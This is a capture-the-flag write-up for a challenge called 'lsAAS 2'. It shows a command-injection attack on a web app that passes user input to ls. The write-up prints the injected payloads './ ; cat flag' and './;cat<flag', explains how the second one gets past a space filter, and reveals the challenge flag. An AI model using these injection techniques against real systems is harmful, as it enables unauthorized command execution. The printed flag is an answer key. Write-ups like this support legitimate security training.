# lsAAS 2

## Write-Up

When we acess to the website, we can see that it asks us for the name of the folder to list the content using `ls`. When we give it the currect directory ( `./` ), it give us the result with the currect directory content where it lists `flag` it it.

So, we can deduce that it acually concatenate our input with ls command and execute it. So we can give it the following input :

```
./ ; cat flag
```

But unfortunatly, this doesn't work : 

```
That's not allowed 
```

But after multiple tries, we can see that it is acually sensitive to the space. So, we might need a command that doesn't contain a space and give same result as previsous one :

```
./;cat<flag
```

here is the output :

```
app.ini app.py flag requirements.txt templates wsgi.py
shellmates{Y0u_M4d3_UR_W4Y_THR0U9Gh_my_L5_AG4IN_AGHHH} 
```

## Flag

shellmates{Y0u_M4d3_UR_W4Y_THR0U9Gh_my_L5_AG4IN_AGHHH}